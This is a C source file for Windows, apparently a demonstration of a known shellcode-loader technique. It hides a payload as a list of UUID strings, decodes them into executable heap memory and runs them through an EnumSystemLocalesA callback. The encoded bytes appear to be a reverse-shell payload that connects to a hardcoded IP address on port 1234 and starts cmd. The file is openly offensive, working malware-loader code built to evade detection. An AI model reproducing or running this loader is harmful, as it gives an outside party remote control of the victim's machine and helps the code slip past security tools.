// Stephan Borosh (rvrsh3ll|@424f424f) & Matt Kingstone for the technique
#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>

#pragma comment(lib, "Rpcrt4.lib")

int main() {
    
    const char* uuids[] =
    {
        "e48348fc-e8f0-00c0-0000-415141505251",
        "d2314856-4865-528b-6048-8b5218488b52",
        "728b4820-4850-b70f-4a4a-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "48514152-528b-8b20-423c-4801d08b8088",
        "48000000-c085-6774-4801-d0508b481844",
        "4920408b-d001-56e3-48ff-c9418b348848",
        "314dd601-48c9-c031-ac41-c1c90d4101c1",
        "f175e038-034c-244c-0845-39d175d85844",
        "4924408b-d001-4166-8b0c-48448b401c49",
        "8b41d001-8804-0148-d041-5841585e595a",
        "59415841-5a41-8348-ec20-4152ffe05841",
        "8b485a59-e912-ff57-ffff-5d49be777332",
        "0032335f-4100-4956-89e6-4881eca00100",
        "e5894900-bc49-0002-04d2-645bb00d4154",
        "4ce48949-f189-ba41-4c77-2607ffd54c89",
        "010168ea-0000-4159-ba29-806b00ffd550",
        "c9314d50-314d-48c0-ffc0-4889c248ffc0",
        "41c18948-eaba-df0f-e0ff-d54889c76a10",
        "894c5841-48e2-f989-41ba-99a57461ffd5",
        "40c48148-0002-4900-b863-6d6400000000",
        "41504100-4850-e289-5757-574d31c06a0d",
        "e2504159-66fc-44c7-2454-0101488d4424",
        "6800c618-8948-56e6-5041-504150415049",
        "5041c0ff-ff49-4dc8-89c1-4c89c141ba79",
        "ff863fcc-48d5-d231-48ff-ca8b0e41ba08",
        "ff601d87-bbd5-1de0-2a0a-41baa695bd9d",
        "8348d5ff-28c4-063c-7c0a-80fbe07505bb",
        "6f721347-006a-4159-89da-ffd590909090"
    };

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* alloc_mem = HeapAlloc(hHeap, 0, 0x1000);
    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int init = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < init; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)ptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA != RPC_S_OK\n");
            CloseHandle(alloc_mem);
            return -1;
        }
        ptr += 16;
    }
    /*
    printf("[+] HexDump: \n");
    for (int i = 0; i < init * 16; i++) {
        printf("%02X ", ((unsigned char*)alloc_mem)[i]);
    }
    */
    
    //((void(*)())alloc_mem)();


    /*
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    WaitForSingleObject(tHandle, INFINITE);
    */
    EnumSystemLocalesA((LOCALE_ENUMPROCA)alloc_mem, 0);

    return 0;
    

}